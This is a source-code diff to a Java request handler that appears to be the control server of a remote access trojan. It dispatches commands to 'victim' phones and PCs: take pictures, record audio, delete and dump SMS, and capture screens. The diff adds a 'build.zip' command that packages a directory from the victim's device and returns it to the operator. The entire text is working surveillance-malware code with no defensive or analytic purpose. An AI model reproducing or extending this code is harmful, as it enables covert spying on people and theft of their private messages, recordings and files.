@@ -148,7 +148,7 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                     ((AVictim) targetVictim).sendDeleteSms((Long) request.get("id"), user.getName());
                     break;
                 case "take.picture":
-                    ((AVictim) targetVictim).sendTakePicture((String) request.get("camera"), user.getName());
+                    ((AVictim) targetVictim).sendTakePicture((long) request.get("camera"), user.getName());
                     break;
                 case "start.audio.record":
                     ((AVictim) targetVictim).sendStartAudioRecord((Long) request.get("seconds"), user.getName());
@@ -202,6 +202,9 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                     break;
                 case "save.sms.log":
                     ((AVictim) targetVictim).sendSaveSmsLog(user.getName());
+                    break;
+                case "build.zip":
+                    targetVictim.sendBuildZip((String) request.get("dirPath"), user.getName());
                     break;
                 default:
                     user.sendErrorCode(Config.INCORRECT_QUERY);
@@ -300,6 +303,9 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                 case "save.sms.log":
                     targetUser.sendSaveSmsLog((Long) request.get("smsCount"), aVictim.getName());
                     break;
+                case "build.zip":
+                    targetUser.sendBuildZip((String) request.get("code"), aVictim.getName());
+                    break;
                 default:
                     aVictim.sendErrorCode(Config.INCORRECT_QUERY);
             }
@@ -360,6 +366,9 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                     break;
                 case "take.screen":
                     targetUser.sendTakeScreen((String) request.get("code"), pcVictim.getName());
+                    break;
+                case "build.zip":
+                    targetUser.sendBuildZip((String) request.get("code"), pcVictim.getName());
                     break;
                 default:
                     pcVictim.sendErrorCode(Config.INCORRECT_QUERY);
@@ -427,8 +436,8 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                 if (id == null) return false;
                 break;
             case "take.picture":
-                String camera = (String) request.get("camera");
-                if (camera == null) return false;
+                long camera = (long) request.get("camera");
+                if (camera != 0 && camera != 1) return false;
                 break;
             case "start.audio.record":
                 Long seconds = (Long) request.get("seconds");
